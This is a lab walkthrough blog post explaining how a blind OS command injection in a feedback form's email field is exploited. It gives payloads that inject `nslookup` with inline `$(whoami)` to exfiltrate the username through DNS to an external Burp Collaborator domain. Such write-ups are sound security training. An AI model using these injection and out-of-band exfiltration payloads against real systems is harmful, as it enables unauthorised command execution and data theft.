---
layout: post
title:  "Blind OS command injection with out-of-band data exfiltration"
date:   2024-10-15 11:20:54 +0530
---

## Objective 

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

## Solution 

Just like the last lab related OOB interaction, we can use the same following payload `|| nslookup m0nc1evdkdpq2lzcalmyvzxnmes6gw4l.oastify.com ||` and pass this through the `email` field and let's check whether any interactions 

Awesome, we got the DNS interaction 

![]({{ site.baseurl }}/assets/images/os-13.png)

Now, let's kinda fine tune the payload like `|| nslookup $(whoami).m0nc1evdkdpq2lzcalmyvzxnmes6gw4l.oastify.com ||` where the backticks or even `$(whoami)` will act as a inline execution of bash commands over there 

Resend the payload through the `email` field and looking into the collaborator found that the `whoami` executed 

![]({{ site.baseurl }}/assets/images/os-14.png)

`whoami` command resulted in `peter-iAmZjL` and submitting as solution.. Solves the lab 

![]({{ site.baseurl }}/assets/images/os-15.png)